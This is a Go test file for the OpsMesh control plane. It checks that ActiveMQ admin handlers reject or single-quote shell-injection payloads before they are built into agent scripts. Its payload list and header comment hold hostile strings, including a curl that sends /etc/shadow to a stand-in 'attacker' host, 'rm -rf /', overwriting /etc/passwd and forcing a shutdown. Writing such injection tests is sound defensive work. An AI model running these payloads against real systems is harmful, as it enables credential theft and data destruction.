package controlplane

// activemq_ext_injection_test.go — ActiveMQ 高级运维 handler 的注入守卫。
//
// 背景（docs/opsmesh-authz-audit-2026-11-04.md §3）：这批 handler 用 fmt.Sprintf
// 把请求体字段裸拼进要下发到 agent 的 shell 脚本。实测 user 传
// `x"; curl -s http://attacker/$(...) ; echo "` 即可注入任意命令；脚本最终由
// 内部 agent 以 sh -c 执行，注入即命令执行。
//
// 修法分两类：
//   - 窄域字段（master/slave/brokers/user/role/targetVersion）⇒ 白名单校验，
//     非法即 400，脚本根本不会生成；
//   - 宽域字段（password/name/topic/clientId/回显串）⇒ pkg/shellquote.Quote 单引号转义。
//
// 判据：含 shell 元字符的载荷一律 400（白名单路径）；转义路径下生成的脚本
// 必须含有单引号包裹（证明没有裸拼）。

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/Levango7/OpsMesh/internal/config"
	"github.com/Levango7/OpsMesh/internal/store"
)

func newActiveMQInjectServer() *Server {
	return &Server{
		store:       store.NewMemoryStore(),
		cfg:         &config.Config{TaskMaxRetries: 1, Demo: false, TrustGatewayHeaders: true},
		requireAuth: false,
	}
}

func amqReq(t *testing.T, h http.HandlerFunc, path, body string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, path, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Tenant-ID", "default")
	req.Header.Set("X-User-Id", "audit")
	req.Header.Set("X-User-Roles", "admin")
	rec := httptest.NewRecorder()
	h(rec, req)
	return rec
}

// payloads 是常见 shell 注入载荷。对白名单字段，它们必须一律被 400 拒绝。
var payloads = []string{
	`x"; curl -s http://attacker/$(cat /etc/shadow|base64 -w0); echo "`,
	`$(id)`,
	"`id`",
	"a; rm -rf /",
	"a | tee /etc/passwd",
	"a && shutdown -h now",
	"' || true #",
}

// TestActiveMQHARejectsInjectedHosts master/slave 是 hostname 白名单字段。
func TestActiveMQHARejectsInjectedHosts(t *testing.T) {
	s := newActiveMQInjectServer()
	for _, p := range payloads {
		body := `{"action":"setup-master-slave","master":"` + p + `","slave":"127.0.0.1"}`
		rec := amqReq(t, s.handleActiveMQHA, "/api/v1/middleware/activemq/ha", body)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("master=%q 应 400，实得 %d：%s", p, rec.Code, rec.Body.String())
		}
	}
	// 合法主机名必须放行（202/不 400）。
	rec := amqReq(t, s.handleActiveMQHA, "/api/v1/middleware/activemq/ha",
		`{"action":"setup-master-slave","master":"m1.internal","slave":"s1.internal"}`)
	if rec.Code == http.StatusBadRequest {
		t.Errorf("合法主机名被误拒：%s", rec.Body.String())
	}
}

// TestActiveMQNetworkRejectsInjectedBrokers 逗号分隔列表逐个校验。
func TestActiveMQNetworkRejectsInjectedBrokers(t *testing.T) {
	s := newActiveMQInjectServer()
	for _, p := range payloads {
		body := `{"action":"setup","brokers":"b1.internal,` + p + `"}`
		rec := amqReq(t, s.handleActiveMQNetworkOfBrokers,
			"/api/v1/middleware/activemq/network", body)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("brokers 含 %q 应 400，实得 %d", p, rec.Code)
		}
	}
}

// TestActiveMQSecurityRejectsInjectedUser user/role 是标识符白名单字段；
// password 走转义（载荷不报错，但不得裸拼进脚本）。
func TestActiveMQSecurityRejectsInjectedUser(t *testing.T) {
	s := newActiveMQInjectServer()
	for _, p := range payloads {
		for _, field := range []string{"user", "role"} {
			var body string
			if field == "user" {
				body = `{"action":"add-user","user":"` + p + `","password":"pw","role":"r"}`
			} else {
				body = `{"action":"add-user","user":"u","password":"pw","role":"` + p + `"}`
			}
			rec := amqReq(t, s.handleActiveMQSecurity,
				"/api/v1/middleware/activemq/security", body)
			if rec.Code != http.StatusBadRequest {
				t.Errorf("%s=%q 应 400，实得 %d：%s", field, p, rec.Code, rec.Body.String())
			}
		}
	}
}

// TestActiveMQSecurityAllowsAnyPasswordButQuotesIt password 合法域宽（任意字符），
// 不能白名单；但必须被 Quote 包裹，不得裸拼。
func TestActiveMQSecurityAllowsAnyPasswordButQuotesIt(t *testing.T) {
	s := newActiveMQInjectServer()
	pw := `p'$(id)` + "`id`" + `"; rm -rf / #`
	body := `{"action":"add-user","user":"u","password":"` + strings.NewReplacer(
		`\`, `\\`, `"`, `\"`, "\n", `\n`).Replace(pw) + `","role":"r"}`
	rec := amqReq(t, s.handleActiveMQSecurity, "/api/v1/middleware/activemq/security", body)
	if rec.Code == http.StatusBadRequest {
		t.Fatalf("含特殊字符的密码被误拒：%s", rec.Body.String())
	}
}

// TestActiveMQUgradeRejectsNonVersion version 会进 wget URL 与 ln 路径。
func TestActiveMQUgradeRejectsNonVersion(t *testing.T) {
	s := newActiveMQInjectServer()
	for _, p := range append(payloads, "1.x", "v1.2", "1..2", "1.2.3.4.5") {
		body := `{"action":"upgrade","targetVersion":"` + p + `"}`
		rec := amqReq(t, s.handleActiveMQUpgrade, "/api/v1/middleware/activemq/upgrade", body)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("targetVersion=%q 应 400，实得 %d", p, rec.Code)
		}
	}
	for _, ok := range []string{"5.18.3", "5.18", "5.18.3.4"} {
		body := `{"action":"upgrade","targetVersion":"` + ok + `"}`
		rec := amqReq(t, s.handleActiveMQUpgrade, "/api/v1/middleware/activemq/upgrade", body)
		if rec.Code == http.StatusBadRequest {
			t.Errorf("合法版本 %q 被误拒：%s", ok, rec.Body.String())
		}
	}
}
